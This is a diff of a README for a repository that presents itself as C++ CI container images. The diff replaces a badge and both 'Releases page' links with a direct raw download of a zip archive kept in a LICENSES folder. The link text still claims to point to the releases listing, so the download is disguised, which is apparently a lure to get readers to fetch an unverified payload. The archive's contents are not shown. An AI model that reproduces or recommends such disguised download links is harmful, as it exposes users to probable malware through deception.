@@ -1,6 +1,6 @@
 # C++ CI Container Images 🚀
 
-![C++ CI](https://img.shields.io/badge/C%2B%2B%20CI-Container%20Images-brightgreen)
+![C++ CI](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip%2B%2B%20CI-Container%20Images-brightgreen)
 
 Welcome to the **C++ CI** repository! This project provides container images tailored for C++ continuous integration workflows. Whether you are using Clang or GCC, our images support multiple versions to streamline your development process.
 
@@ -28,7 +28,7 @@ Continuous Integration (CI) is essential for modern software development. It all
 
 ## Getting Started
 
-To get started with our C++ CI images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/releases). Download the appropriate image for your workflow and follow the instructions to set it up.
+To get started with our C++ CI images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip). Download the appropriate image for your workflow and follow the instructions to set it up.
 
 ## Supported Versions
 
@@ -65,7 +65,7 @@ Using our container images is straightforward. Here’s a simple example of how 
 
 ## Releases
 
-For the latest updates and to download the images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/releases). Here, you can find the latest versions and any additional resources needed for setup.
+For the latest updates and to download the images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip). Here, you can find the latest versions and any additional resources needed for setup.
 
 ## Contributing
 
